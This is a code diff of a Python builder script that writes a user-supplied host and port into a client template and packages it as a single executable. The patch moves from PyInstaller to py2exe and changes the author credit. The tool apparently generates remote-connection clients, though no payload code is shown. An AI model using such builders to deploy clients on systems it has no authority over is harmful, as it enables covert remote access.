@@ -5,14 +5,16 @@ import socket
 import os
 import struct
 import shutil
+from distutils.core import setup
+import py2exe, sys, os
 
 
 
 ##############################################
 #                                            #
-#                   v1.2                     #
-#           Coded by Blueman678              #
-#   GitHub: https://github.com/Blueman678/   #
+#                   v0.2                     #
+#           Coded by Omikrone                #
+#   GitHub: https://github.com/Omikrone/     #
 #                                            #
 ##############################################
 
@@ -66,19 +68,21 @@ def create(): #configure the client with ip and port
     HOST = input("Enter the host/ip of the client: ")
     PORT = input("Enter the port of the client: ")
     exe = input("Do you want to create an executable (y/n): ")
-    with open('data/client.txt', 'r') as file:
+    with open('data/client.py', 'r', encoding='utf8') as file:
         content = file.readlines()
     content[content.index("HOST = '127.0.0.1'\n")] = f"HOST = '{HOST}'\n"
     content[content.index("PORT = 51025\n")] = f"PORT = {PORT}\n"
-    with open('client.py', 'w') as file:
+    with open('data/client.py', 'w', encoding='utf8') as file:
         file.write(''.join(content))
     if exe == 'y':
         os.system(clear)
         print('Creating the executable... This may take a while.')
-        os.system("pyinstaller -wF --clean --onefile --distpath exe --log-level WARN client.py")
-        os.remove('client.spec')
-        os.remove('client.py')
-        shutil.rmtree('build')
+        sys.argv.append('py2exe')
+        setup(
+        options = {'py2exe': {'bundle_files': 1, 'compressed': True}},
+        console = [{'script': "data/client.py"}],
+        zipfile = None,
+        )
         print("Executable file succesfully created in folder 'exe'!\n")
     else:
         print("Python file succesfully created!\n")
